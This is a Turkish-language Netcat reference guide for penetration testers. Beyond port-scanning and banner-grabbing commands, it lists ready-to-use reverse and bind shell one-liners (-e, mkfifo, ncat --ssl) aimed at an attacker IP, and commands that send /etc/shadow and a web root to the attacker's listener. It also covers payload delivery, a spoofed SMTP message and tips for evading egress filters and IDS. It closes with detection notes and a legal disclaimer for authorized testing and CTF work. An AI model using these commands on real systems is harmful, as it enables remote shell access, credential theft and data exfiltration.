# 🔌 Netcat (nc) - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English Version](../README.md)

```
  ███╗   ██╗███████╗████████╗ ██████╗ █████╗ ████████╗
  ████╗  ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝
  ██╔██╗ ██║█████╗     ██║   ██║     ███████║   ██║   
  ██║╚██╗██║██╔══╝     ██║   ██║     ██╔══██║   ██║   
  ██║ ╚████║███████╗   ██║   ╚██████╗██║  ██║   ██║   
  ╚═╝  ╚═══╝╚══════╝   ╚═╝    ╚═════╝╚═╝  ╚═╝   ╚═╝   
       Sızma Testi Uzmanları ve Sistem Yöneticileri İçin TCP/IP İsviçre Çakısı
```

<p align="center">
  <img src="https://img.shields.io/badge/Netcat-TCP_IP_Swiss_Army_Knife-blue?style=for-the-badge" alt="Netcat">
  <img src="https://img.shields.io/badge/Kategori-Sömürü_&_Kabuklar-orange?style=for-the-badge" alt="Sömürü & Kabuklar">
  <img src="https://img.shields.io/badge/Protokoller-TCP_UDP-green?style=for-the-badge" alt="Protokoller TCP/UDP">
  <img src="https://img.shields.io/badge/Lisans-BSD_/_GPL-red?style=for-the-badge" alt="Lisans">
</p>

<p align="center">
  <b>🌐 TCP ve UDP ağ soketleri üzerinden ham bayt düzeyinde veri okuma, yazma, port dinleme ve tünelleme aracı</b>
</p>

---

## 📋 İçindekiler

- [Genel Bakış & Netcat Felsefesi](#-genel-bakış--netcat-felsefesi)
- [Netcat Varyantları & Dağıtım Farklılıkları](#-netcat-varyantları--dağıtım-farklılıkları)
  - [OpenBSD Netcat (`nc.openbsd`)](#openbsd-netcat-ncopenbsd)
  - [Geleneksel Netcat (`nc.traditional`)](#geleneksel-netcat-nctraditional)
  - [Nmap Ncat (`ncat`)](#nmap-ncat-ncat)
- [Araç Karşılaştırması: Netcat Varyantları ve Socat](#-araç-karşılaştırması-netcat-varyantları-ve-socat)
- [Kurulum & Varyantlar Arasında Geçiş Yapma](#-kurulum--varyantlar-arasında-geçiş-yapma)
- [Temel Komut Satırı Bayrakları](#-temel-komut-satırı-bayrakları)
- [Port Tarama ve Banner Bilgisi Toplama](#-port-tarama-ve-banner-bilgisi-toplama)
- [Ters (Reverse) ve Dışa Açık (Bind) Kabuklar](#-ters-reverse-ve-dışa-açık-bind-kabuklar)
  - [Geleneksel Komut Çalıştırma (`-e`)](#geleneksel-komut-çalıştırma--e)
  - [OpenBSD İsimlendirilmiş Boru (FIFO) Ters Kabuk Yöntemi](#openbsd-isimlendirilmiş-boru-fifo-ters-kabuk-yöntemi)
  - [OpenBSD FIFO ile Dışa Açık (Bind) Kabuk](#openbsd-fifo-ile-dışa-açık-bind-kabuk)
  - [Ncat ile Şifreli TLS/SSL Kabuk Kurulumu (`--ssl`)](#ncat-ile-şifreli-tlsssl-kabuk-kurulumu---ssl)
- [Ağ Üzerinden Dosya Aktarım Teknikleri](#-ağ-üzerinden-dosya-aktarım-teknikleri)
  - [Hedeften Saldırgana Veri Çıkarma (Exfiltration)](#hedeften-saldırgana-veri-çıkarma-exfiltration)
  - [Saldırgandan Hedefe Dosya Yükleme (Payload Delivery)](#saldırgandan-hedefe-dosya-yükleme-payload-delivery)
  - [Dizinleri Canlı Sıkıştırarak Aktarma (`tar + nc`)](#dizinleri-canlı-sıkıştırarak-aktarma-tar--nc)
- [Port Yönlendirme & Ağ Rölesi (Relay)](#-port-yönlendirme--ağ-rölesi-relay)
- [Web Sunucusu ve Honeypot Simülasyonu](#-web-sunucusu-ve-honeypot-simülasyonu)
- [Ağ Hata Ayıklama & Manuel Protokol Etkileşimi](#-ağ-hata-ayıklama--manuel-protokol-etkileşimi)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Savunma Açısından Değerlendirme & OPSEC](#-savunma-açısından-değerlendirme--opsec)
- [Yasal Uyarı](#-yasal-uyarı)

---

## 🎯 Genel Bakış & Netcat Felsefesi

İlk olarak 1995 yılında **Hobbit** takma adlı geliştirici tarafından yazılan **Netcat** (çoğu sistemde doğrudan `nc` olarak çağrılır), siber güvenlik ve Unix ekosisteminde haklı olarak **"TCP/IP İsviçre Çakısı"** unvanını kazanmıştır.

Ağır uygulama katmanı protokollerinin veya hantal yönetim yazılımlarının aksine Netcat, tek bir görevi en saf haliyle yerine getirir: **TCP veya UDP üzerinden ham bayt düzeyinde ağ soketi açar ve bu soketi doğrudan standart girdi (`stdin`) ile standart çıktıya (`stdout`) bağlar**.

İster sızma testlerinde ters kabuk (reverse shell) yakalamak, ister SMB/FTP erişimi olmayan kısıtlı ortamlarda dosya aktarmak, ister servis banner'larını analiz etmek veya güvenlik duvarı filtrelerini test etmek olsun; Netcat her güvenlik uzmanının araç setinin vazgeçilmez bir parçasıdır.

---

## ⚖️ Netcat Varyantları & Dağıtım Farklılıkları

Sızma testlerinde ve CTF yarışmalarında en sık karşılaşılan kafa karışıklıklarından biri, **birden fazla farklı projenin aynı `nc` komutunu paylaşmasıdır**. Karşınızdaki sistemde hangi Netcat varyantının kurulu olduğunu bilmek, kullanabileceğiniz sözdizimi ve istismar kabiliyetlerini belirler.

```
+-------------------------------------------------------------------------+
|                                nc Komutu                                |
+------------------------------------+------------------------------------+
|                                    |                                    |
|             Debian / Ubuntu        |               CentOS / RHEL        |
|            (Varsayılan: OpenBSD)   |              (Varsayılan: Ncat)    |
+------------------+-----------------+------------------+-----------------+
                   |                                    |
     +-------------+-------------+                      |
     |                           |                      |
[netcat-openbsd]       [netcat-traditional]          [ncat]
(-e bayrağı kapalı)    (GAPING_SECURITY_HOLE)   (Nmap Projesi / SSL)
```

### OpenBSD Netcat (`nc.openbsd`)
- **Varsayılan olduğu sistemler:** Kali Linux, Debian, Ubuntu, Linux Mint.
- **En belirgin özelliği:** Güvenlik gerekçesiyle, sisteme keyfi komut çalıştırma açığı vermemek adına `-e` (program çalıştırma) bayrağı kaynak kod derleme aşamasında tamamen kaldırılmıştır.
- **Sürüm kontrolü:**
  ```bash
  nc -h 2>&1 | grep -i "OpenBSD"
  # Çıktı: OpenBSD netcat (Debian patchlevel ...)
  ```
- **Kabuk (shell) çözümü:** `-e` bulunmadığı için Linux'un isimlendirilmiş boruları (`mkfifo`) kullanılarak `stdin` ve `stdout` kabuğa köprülenir.

### Geleneksel Netcat (`nc.traditional`)
- **Orijinal yazar:** Hobbit (v1.10).
- **En belirgin özelliği:** `-DGAPING_SECURITY_HOLE` direktifi ile derlenmiştir; doğrudan `-e` veya `-c` bayrağını destekler (`nc -e /bin/bash`).
- **Sürüm kontrolü:**
  ```bash
  nc -h 2>&1 | grep -i "GAPING"
  ```

### Nmap Ncat (`ncat`)
- **Geliştirici:** Gordon Lyon (Fyodor) / Nmap Projesi.
- **En belirgin özelliği:** Modern siber güvenlik ihtiyaçları için sıfırdan yazılmıştır. **TLS/SSL uçtan uca şifreleme**, IP erişim denetim listeleri (`--allow`, `--deny`), istemci aracılık modu (`--broker`) ve SOCKS4/5 proxy desteği sunar.

---

## ⚖️ Araç Karşılaştırması: Netcat Varyantları ve Socat

| Özellik | `netcat-openbsd` | `netcat-traditional` | `ncat` (Nmap) | `socat` |
|---------|------------------|----------------------|---------------|---------|
| **Komut Çalıştırma (`-e`)** | ❌ Kaldırılmış | ✅ Var (`-e`) | ✅ Var (`-e`, `--exec`) | ✅ Var (`EXEC:`) |
| **SSL / TLS Şifreleme** | ❌ Yok | ❌ Yok | ✅ Doğal Var (`--ssl`) | ✅ Doğal Var (`OPENSSL:`) |
| **FIFO Boru ile Kabuk** | ✅ Evet (`mkfifo`) | ✅ Evet | ✅ Evet | ✅ Evet |
| **Port Tarama Modu** | ✅ Var (`-z`) | ✅ Var (`-z`) | ❌ Yok | ❌ Yok |
| **Kalıcı Dinleyici (Keep-Open)**| ✅ Var (`-k`) | ❌ Yok (Bağlantı kopunca kapanır) | ✅ Var (`-k`) | ✅ Var (`fork`) |
| **IPv6 Desteği** | ✅ Doğal (`-6`) | ❌ Sınırlı | ✅ Doğal (`-6`) | ✅ Doğal |
| **Proxy / SOCKS Desteği** | ✅ Var (`-X`, `-x`) | ❌ Yok | ✅ Var (`--proxy`) | ✅ Tam Destek |
| **Çoklu İstemci / Sohbet (Broker)**| ❌ Yok | ❌ Yok | ✅ Var (`--broker`) | ❌ Manuel yapılandırma |
| **Kali / Debian Varsayılanı** | ✅ Evet (`/bin/nc`) | 🔄 Paket (`apt`) | 🔄 Paket (`ncat`) | 🔄 Paket (`socat`) |

---

## 📥 Kurulum & Varyantlar Arasında Geçiş Yapma

Debian ve Kali Linux tabanlı sistemlerde tüm Netcat varyantları kurulabilir ve `update-alternatives` mekanizması ile varsayılan `nc` sembolik bağı değiştirilebilir:

```bash
# Tüm Netcat varyantlarını ve socat'ı yükleme
sudo apt update
sudo apt install -y netcat-openbsd netcat-traditional ncat socat

# Şu anki varsayılan ikiliyi görme
readlink -f /bin/nc

# Varsayılan nc aracını etkileşimli menüden değiştirme
sudo update-alternatives --config nc
```

Sistem varsayılanını bozmadan doğrudan belirli bir varyantı çalıştırmak için:
```bash
# OpenBSD varyantını doğrudan çağırma
nc.openbsd -lvnp 4444

# Geleneksel varyantı doğrudan çağırma
nc.traditional -lvnp 4444 -e /bin/bash

# Nmap Ncat aracını çağırma
ncat -lvnp 4444 --ssl
```

---

## ⚙️ Temel Komut Satırı Bayrakları

| Bayrak | Anlamı ve İşlevi |
|--------|-------------------|
| `-l` | **Dinleme Modu (Listen)**: Dışa bağlantı açmak yerine belirtilen portta gelen bağlantıları bekler. |
| `-v` | **Ayrıntılı Çıktı (Verbose)**: Bağlantı durumu ve hata detaylarını görüntüler (`-vv` daha ayrıntılı bilgi verir). |
| `-n` | **Sadece Sayısal IP**: DNS çözümlemesini devre dışı bırakır. Hız kazandırır ve hedef DNS sunucularında iz bırakmayı engeller. |
| `-p <port>` | **Yerel Port (Local Port)**: Dinlenecek veya kaynak olarak bağlanılacak port numarasını belirler. |
| `-u` | **UDP Modu**: Varsayılan TCP akışı yerine UDP protokolünü kullanır. |
| `-k` | **Sürekli Dinle (Keep-Open)**: Bir istemci bağlantıyı kestiğinde dinleyicinin kapanmasını engeller, yeni bağlantıları beklemeye devam eder. |
| `-w <sn>` | **Zaman Aşımı (Timeout)**: Bağlantı kurma veya soket okuma işlemlerinde saniye cinsinden zaman aşımı belirler. |
| `-z` | **Sıfır G/Ç (Zero-I/O)**: Tarama modu. Sokete veri göndermeden sadece el sıkışması tamamlandığında soketi hemen kapatır. |
| `-q <sn>` | **EOF Sonrası Bekle**: Standart girdi (`stdin`) kapandığında (EOF) soketi kapatmadan önce belirtilen saniye kadar bekler. |
| `-s <ip>` | **Kaynak IP**: Paketlerin gönderileceği veya dinleneceği yerel ağ arayüzü IP adresini sabitler. |
| `-4` / `-6` | Yalnızca IPv4 veya yalnızca IPv6 adreslerini kullanmaya zorlar. |

---

## 🔍 Port Tarama ve Banner Bilgisi Toplama

Hedef makinede `nmap` kurulu olmadığında veya üçüncü parti araç yüklemenin yasak olduğu kısıtlı ortamlarda Netcat, yerel portları anında tespit etmek için mükemmel bir alternatiftir.

### Hızlı Port Taraması

```bash
# Belirli bir port aralığını TCP ile tarama (Zero-I/O, sayısal, 1 sn zaman aşımı)
nc -zvn -w 1 192.168.1.100 20-100

# Sık kullanılan kritik servis portlarını kontrol etme
nc -zvn -w 2 10.10.10.50 21 22 80 443 445 3389

# UDP Port Taraması (DNS, SNMP, NTP)
nc -zvun -w 2 10.10.10.50 53 161 123
```

### Servis Banner Bilgisi Toplama (Banner Grabbing)

Servislerin sürüm bilgilerini öğrenmek için doğrudan sokete bağlanıp yanıt bekleyebilirsiniz:

```bash
# SSH sunucu sürümünü alma
nc -vn 10.10.10.10 22

# FTP servis yanıtını alma
nc -vn 10.10.10.10 21

# SMTP e-posta sunucusunun karşılama mesajını alma
nc -vn 10.10.10.10 25

# Manuel HTTP HEAD isteği göndererek web sunucu başlıklarını çekme
printf "HEAD / HTTP/1.1\r\nHost: target.local\r\nConnection: close\r\n\r\n" | nc -vn 10.10.10.10 80
```

---

## 💀 Ters (Reverse) ve Dışa Açık (Bind) Kabuklar

Netcat soketi üzerinden bir komut satırı yorumlayıcısını (`/bin/sh`, `/bin/bash`, `cmd.exe`) yönlendirmek, sızma testlerindeki en temel istismar adımıdır.

### Geleneksel Komut Çalıştırma (`-e`)

Hedef makinede `netcat-traditional` veya `ncat` mevcutsa:

```bash
# 1. Saldırgan makinesinde dinleyici başlatma
nc -lvnp 4444

# 2. Hedef makineden ters kabuk tetikleme (Linux)
nc.traditional 10.10.14.5 4444 -e /bin/bash

# Hedef makineden ters kabuk tetikleme (Windows)
nc.exe 10.10.14.5 4444 -e cmd.exe

# Dışa Açık Kabuk (Bind Shell - Hedef dinler, saldırgan bağlanır)
# Hedefte:
nc.traditional -lvnp 8888 -e /bin/bash
# Saldırganda:
nc -vn 10.10.10.50 8888
```

### OpenBSD İsimlendirilmiş Boru (FIFO) Ters Kabuk Yöntemi

Modern Debian, Ubuntu ve Kali sistemlerinde `nc` üzerinde `-e` bayrağı bulunmaz. Bu engeli aşmak için Linux'un **FIFO (First-In-First-Out) isimlendirilmiş boru mekanizması** kullanılır:

```bash
# 1. Saldırgan dinleyicisini açar
nc -lvnp 4444

# 2. Hedef sistemde FIFO ters kabuk komutu çalıştırılır
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 >/tmp/f
```

#### FIFO Mekanizması Nasıl Çalışır?
1. `rm -f /tmp/f`: Eski veya kilitli boru dosyasını temizler.
2. `mkfifo /tmp/f`: `/tmp` dizini altında özel bir FIFO boru dosyası oluşturur.
3. `cat /tmp/f`: Boruya gelen verileri okuyup `/bin/sh -i` standart girdisine besler.
4. `| /bin/sh -i 2>&1`: Etkileşimli bir kabuk açar, hata çıktılarını (`stderr`) standart çıktıya (`stdout`) yönlendirir.
5. `| nc 10.10.14.5 4444 >/tmp/f`: Kabuğun ürettiği çıktıları ağ üzerinden saldırgana yollar; saldırgandan gelen klavye girdilerini ise yeniden `/tmp/f` borusunun içine basarak döngüyü tamamlar.

### OpenBSD FIFO ile Dışa Açık (Bind) Kabuk

Hedef makinenin gelen bağlantılara açık bir IP adresi ve portu varsa:

```bash
# Hedef kurban sistemde dinleyici açılır:
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l -p 8888 >/tmp/f

# Saldırgan sisteme bağlanır:
nc -vn 10.10.10.50 8888
```

### Ncat ile Şifreli TLS/SSL Kabuk Kurulumu (`--ssl`)

Düz metin Netcat trafiği ağ izleme araçları (IDS/IPS, Wireshark, Suricata) tarafından anında yakalanır ve içeriği okunabilir. `ncat` ile şifreli tünel kurulabilir:

```bash
# 1. Saldırgan SSL şifreli dinleyiciyi başlatır
ncat --ssl -lvnp 4444

# 2. Hedef makine SSL şifreli ters kabuk gönderir
ncat --ssl 10.10.14.5 4444 -e /bin/bash

# Yalnızca belirli bir IP adresine izin veren güvenli dinleyici
ncat --ssl -lvnp 4444 --allow 10.10.14.5
```

---

## 📁 Ağ Üzerinden Dosya Aktarım Teknikleri

SSH, SCP, FTP ve SMB servislerinin kapalı veya engelli olduğu durumlarda Netcat, açık herhangi bir TCP portu üzerinden çift yönlü dosya aktarımı sağlar.

### Hedeften Saldırgana Veri Çıkarma (Exfiltration)

```bash
# 1. Saldırgan portu dinlemeye alır ve gelen veriyi yerel dosyaya yazar
nc -lvnp 9001 > ele_gecirilen_parolalar.txt

# 2. Hedef makine dosyayı okuyup saldırganın dinleyicisine pompalar
nc -vn 10.10.14.5 9001 < /etc/shadow
```

### Saldırgandan Hedefe Dosya Yükleme (Payload Delivery)

```bash
# 1. Saldırgan aracı göndermek üzere dinleyiciyi başlatır
nc -lvnp 9001 < linpeas.sh

# 2. Hedef makine bağlanarak gelen akışı diske kaydeder
nc -vn 10.10.14.5 9001 > linpeas.sh
```

### Bütünlük Doğrulaması (Checksums)

Ham soket aktarımlarından sonra dosyanın eksiksiz iletildiğini doğrulamak için hash kontrolü yapın:

```bash
# Hem kaynak hem hedef sistemde MD5 hash'ini karşılaştırın
md5sum aktarilan_dosya.tar.gz
```

### Dizinleri Canlı Sıkıştırarak Aktarma (`tar + nc`)

Hedef makinenin diskinde geçici zip/tar dosyası oluşturup iz bırakmadan, tüm bir dizini canlı akış halinde saldırgana aktarın:

```bash
# 1. Saldırgan portu dinler ve gelen akışı doğrudan tar ile klasöre açar
nc -lvnp 9001 | tar -xzvf - -C /opt/loot/

# 2. Hedef makine hedef dizini anında sıkıştırıp ağa pompalar
tar -czvf - /var/www/html | nc -vn 10.10.14.5 9001
```

---

## 🔀 Port Yönlendirme & Ağ Rölesi (Relay)

SSH tünelleme veya harici pivot araçları bulunmadığında Netcat ile iki soket birbirine köprülenebilir:

```bash
# 8080 portuna gelen istekleri iç ağdaki 192.168.20.10:3306 MySQL sunucusuna yönlendirme
rm -f /tmp/relay; mkfifo /tmp/relay
nc -l -p 8080 < /tmp/relay | nc 192.168.20.10 3306 > /tmp/relay
```

---

## 🌐 Web Sunucusu ve Honeypot Simülasyonu

### Minimalist Tek Dosyalık HTTP Sunucusu

Hızlı bir webhook yakalamak veya tarayıcıların gönderdiği oturum verilerini kaydetmek için:

```bash
# Tek seferlik HTTP yanıtı döndürme
printf "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Pwned!</h1>\n" | nc -lvnp 80

# Döngü içinde sürekli çalışan ve gelen istek başlıklarını ekrana basan HTTP sunucusu
while true; do
  printf "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 17\r\n\r\nYakalanan Istek!" | \
  nc -lvnp 8080
done
```

### Çoklu İstemci Mesaj / Sohbet Dağıtıcı (`ncat`)

Ncat'in dahili broker modu sayesinde red team operatörleri arasında şifreli veya düz metin sohbet kanalı açılabilir:

```bash
# Dağıtıcı sunucuyu 5555 portunda başlatma
ncat -lvnp 5555 --broker

# Operatörler bu porta bağlanarak birbirlerine anlık mesaj gönderebilir
ncat 10.10.14.5 5555
```

---

## 🛠️ Ağ Hata Ayıklama & Manuel Protokol Etkileşimi

### Ham SMTP Üzerinden E-Posta Gönderme Testi

```bash
nc -vn mail.target.local 25 <<EOF
HELO attacker.local
MAIL FROM:<admin@target.local>
RCPT TO:<kurban@target.local>
DATA
Subject: Guvenlik Bildirimi

Lutfen ekteki dokumani inceleyin.
.
QUIT
EOF
```

### Ham POP3 ile E-Posta Kontrolü

```bash
nc -vn mail.target.local 110
# Sunucu yanıtı: +OK POP3 server ready
USER testuser
# Sunucu yanıtı: +OK
PASS GizliSifre123
# Sunucu yanıtı: +OK User logged in
STAT
RETR 1
QUIT
```

---

## ⚡ Hızlı Referans Tablosu

| İşlem | Komut |
|-------|-------|
| **Standart Port Dinleyici** | `nc -lvnp <PORT>` |
| **Kapanmayan Dinleyici (Keep-Open)**| `nc -lvnp <PORT> -k` |
| **Uzak Sunucuya Bağlanma** | `nc -vn <HEDEF> <PORT>` |
| **UDP Bağlantısı Kurma** | `nc -u -vn <HEDEF> <PORT>` |
| **Hızlı TCP Port Taraması** | `nc -zvn -w 1 <HEDEF> <BASLANGIC>-<BITIS>` |
| **UDP Port Taraması** | `nc -zvun -w 2 <HEDEF> <PORT>` |
| **OpenBSD İsimlendirilmiş Boru Kabuğu** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc <IP> <PORT> >/tmp/f` |
| **Geleneksel Kabuk (`-e`)** | `nc <IP> <PORT> -e /bin/bash` |
| **Şifreli SSL Kabuk (`ncat`)** | `ncat --ssl <IP> <PORT> -e /bin/bash` |
| **Dosya Alma (Dinleyici)** | `nc -lvnp <PORT> > cikan_dosya` |
| **Dosya Gönderme (İstemci)** | `nc -vn <IP> <PORT> < gonderilecek_dosya` |
| **Klasörü Canlı Sıkıştırarak Gönder** | `tar -czvf - /dizin \| nc -vn <IP> <PORT>` |
| **Gelen Canlı Akışı Klasöre Aç** | `nc -lvnp <PORT> \| tar -xzvf -` |
| **Servis Banner Bilgisi Çekme** | `nc -vn -w 2 <HEDEF> <PORT>` |

---

## 🛡️ Savunma Açısından Değerlendirme & OPSEC

1. **Düz Metin (Cleartext) Uyarısı:**
   - Standart Netcat trafiği şifrelenmez. Ağ üzerinde iletilen tüm parolalar, oturum çerezleri ve ters kabuk komutları ağ güvenlik sensörleri (Zeek, Suricata, Wireshark) tarafından doğrudan yakalanabilir.
   - Operasyonel güvenlik için `ncat --ssl` veya SSH tünelleri tercih edilmelidir.
2. **Süreç ve Komut Satırı Denetimi:**
   - Linux sistemlerde `auditd`, eBPF veya Falco gibi izleme mekanizmaları; `-e` bayrağı içeren veya `/tmp/f` gibi isimlendirilmiş borular oluşturan `nc` komutlarını doğrudan alarm olarak işaretler.
   - Windows ortamlarında EDR ajanları `nc.exe` dosyalarını bilinen statik imzaları nedeniyle derhal karantinaya alır.
3. **Egress (Dışa Çıkış) Filtrelerini Aşma:**
   - Ters kabuk dinleyicilerini yapılandırırken giden trafiğe açık olan yaygın portları (`80`, `443`, `53`) tercih etmek, katı güvenlik duvarı kurallarını aşmada fayda sağlar.

---

## ⚠️ Yasal Uyarı

> [!CAUTION]
> Bu kılavuz yalnızca yetkili sızma testleri, güvenlik denetimleri, CTF yarışmaları ve sistem yönetimi amacıyla hazırlanmıştır. Açık yazılı izin olmaksızın hedef sistemlerde port dinleme, ters kabuk çalıştırma veya yetkisiz dosya aktarımı gerçekleştirmek Türk Ceza Kanunu ve uluslararası bilişim suçları mevzuatları kapsamında suçtur. Bilgileri yalnızca yasal ve etik sınırlar içerisinde kullanınız.